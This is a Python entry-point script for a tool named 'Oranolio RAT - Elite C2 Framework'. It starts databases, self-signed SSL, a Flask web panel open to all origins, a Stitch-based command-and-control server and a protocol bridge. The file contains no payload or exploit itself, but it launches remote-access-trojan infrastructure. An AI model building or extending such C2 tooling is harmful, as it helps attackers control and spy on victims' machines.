#!/usr/bin/env python3
"""
Main Entry Point for Oranolio RAT - Elite C2 Framework
Single entry point that initializes and starts all services
"""

import os
import sys
import time
import signal
import threading
import logging
from pathlib import Path
from typing import Optional

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(__file__))

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class OranolioRATSystem:
    """Main system class that manages all components"""
    
    def __init__(self):
        self.running = False
        self.services = {}
        self.threads = []
        
        # Set up signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        logger.info(f"Received signal {signum}, shutting down...")
        self.shutdown()
        sys.exit(0)
    
    def initialize(self):
        """Initialize all system components"""
        logger.info("Initializing Oranolio RAT - Elite C2 Framework")
        logger.info("=" * 60)
        
        try:
            # Check Python version
            if sys.version_info < (3, 8):
                raise RuntimeError("Python 3.8 or higher is required")
            
            # Initialize databases
            self._initialize_databases()
            
            # Initialize SSL certificates
            self._initialize_ssl()
            
            # Initialize configuration
            self._initialize_configuration()
            
            # Initialize services
            self._initialize_services()
            
            logger.info("System initialization completed successfully")
            return True
            
        except Exception as e:
            logger.error(f"System initialization failed: {e}")
            return False
    
    def _initialize_databases(self):
        """Initialize all required databases"""
        logger.info("Initializing databases...")
        
        try:
            from initialize_databases import DatabaseInitializer
            initializer = DatabaseInitializer()
            
            if not initializer.initialize_all_databases():
                raise RuntimeError("Database initialization failed")
            
            logger.info("✓ Databases initialized")
            
        except Exception as e:
            logger.error(f"Database initialization failed: {e}")
            raise
    
    def _initialize_ssl(self):
        """Initialize SSL certificates"""
        logger.info("Initializing SSL certificates...")
        
        try:
            from ssl_utils import generate_self_signed_certificate
            
            success, message = generate_self_signed_certificate()
            if not success:
                logger.warning(f"SSL certificate generation failed: {message}")
                logger.warning("System will run without SSL (not recommended for production)")
            else:
                logger.info("✓ SSL certificates initialized")
                
        except Exception as e:
            logger.warning(f"SSL initialization failed: {e}")
    
    def _initialize_configuration(self):
        """Initialize configuration"""
        logger.info("Initializing configuration...")
        
        try:
            from config import Config
            from web_app_enhancements import integrate_enhancements
            
            # Load configuration
            config = Config()
            logger.info(f"✓ Configuration loaded: {config.APP_NAME} v{config.APP_VERSION}")
            
        except Exception as e:
            logger.error(f"Configuration initialization failed: {e}")
            raise
    
    def _initialize_services(self):
        """Initialize all services"""
        logger.info("Initializing services...")
        
        try:
            # Initialize web app
            self._initialize_web_app()
            
            # Initialize C2 server
            self._initialize_c2_server()
            
            # Initialize native protocol bridge
            self._initialize_native_bridge()
            
            # Initialize monitoring
            self._initialize_monitoring()
            
            logger.info("✓ All services initialized")
            
        except Exception as e:
            logger.error(f"Service initialization failed: {e}")
            raise
    
    def _initialize_web_app(self):
        """Initialize the web application"""
        logger.info("Initializing web application...")
        
        try:
            from web_app import create_app
            from web_app_enhancements import integrate_enhancements
            
            # Create Flask app
            app = create_app()
            
            # Integrate enhancements
            app = integrate_enhancements(app)
            
            self.services['web_app'] = app
            logger.info("✓ Web application initialized")
            
        except Exception as e:
            logger.error(f"Web application initialization failed: {e}")
            raise
    
    def _initialize_c2_server(self):
        """Initialize the C2 server"""
        logger.info("Initializing C2 server...")
        
        try:
            from Application.stitch_cmd import stitch_server
            from config import Config
            
            # Create C2 server instance
            c2_server = stitch_server()
            c2_server.listen_port = Config.STITCH_SERVER_PORT
            
            self.services['c2_server'] = c2_server
            logger.info("✓ C2 server initialized")
            
        except Exception as e:
            logger.error(f"C2 server initialization failed: {e}")
            raise
    
    def _initialize_native_bridge(self):
        """Initialize the native protocol bridge"""
        logger.info("Initializing native protocol bridge...")
        
        try:
            from native_protocol_bridge import start_native_bridge
            from config import Config
            
            # Start native bridge
            start_native_bridge(port=Config.c2_port + 1)
            
            logger.info("✓ Native protocol bridge initialized")
            
        except Exception as e:
            logger.warning(f"Native protocol bridge initialization failed: {e}")
    
    def _initialize_monitoring(self):
        """Initialize monitoring and metrics"""
        logger.info("Initializing monitoring...")
        
        try:
            from web_app_enhancements import get_metrics_collector, get_enhanced_logger
            
            # Initialize metrics collector
            metrics_collector = get_metrics_collector()
            
            # Initialize enhanced logger
            enhanced_logger = get_enhanced_logger()
            
            logger.info("✓ Monitoring initialized")
            
        except Exception as e:
            logger.warning(f"Monitoring initialization failed: {e}")
    
    def start(self):
        """Start all services"""
        logger.info("Starting Oranolio RAT system...")
        
        try:
            self.running = True
            
            # Start C2 server in background thread
            self._start_c2_server()
            
            # Start web application
            self._start_web_app()
            
            logger.info("✓ All services started successfully")
            logger.info("System is ready for operations")
            
        except Exception as e:
            logger.error(f"Failed to start services: {e}")
            self.shutdown()
            raise
    
    def _start_c2_server(self):
        """Start C2 server in background thread"""
        def run_c2_server():
            try:
                c2_server = self.services['c2_server']
                c2_server.cmdloop()
            except Exception as e:
                logger.error(f"C2 server error: {e}")
        
        c2_thread = threading.Thread(target=run_c2_server, daemon=True)
        c2_thread.start()
        self.threads.append(c2_thread)
        
        # Give C2 server time to start
        time.sleep(2)
        logger.info("✓ C2 server started")
    
    def _start_web_app(self):
        """Start web application"""
        try:
            from flask_socketio import SocketIO
            from config import Config
            
            app = self.services['web_app']
            socketio = SocketIO(app, cors_allowed_origins="*")
            
            # Start web server
            socketio.run(
                app,
                host=Config.HOST,
                port=Config.PORT,
                debug=Config.DEBUG,
                use_reloader=False  # Disable reloader in production
            )
            
        except Exception as e:
            logger.error(f"Web application start failed: {e}")
            raise
    
    def shutdown(self):
        """Shutdown all services"""
        logger.info("Shutting down Oranolio RAT system...")
        
        self.running = False
        
        try:
            # Stop native protocol bridge
            from native_protocol_bridge import stop_native_bridge
            stop_native_bridge()
            
            # Stop C2 server
            if 'c2_server' in self.services:
                # C2 server will stop when main thread exits
                pass
            
            logger.info("✓ System shutdown completed")
            
        except Exception as e:
            logger.error(f"Error during shutdown: {e}")

def main():
    """Main function"""
    print("Oranolio RAT - Elite C2 Framework")
    print("=" * 40)
    print("Initializing system...")
    
    # Create system instance
    system = OranolioRATSystem()
    
    # Initialize system
    if not system.initialize():
        logger.error("System initialization failed")
        sys.exit(1)
    
    # Start system
    try:
        system.start()
    except KeyboardInterrupt:
        logger.info("Received interrupt signal")
    except Exception as e:
        logger.error(f"System error: {e}")
    finally:
        system.shutdown()

if __name__ == "__main__":
    main()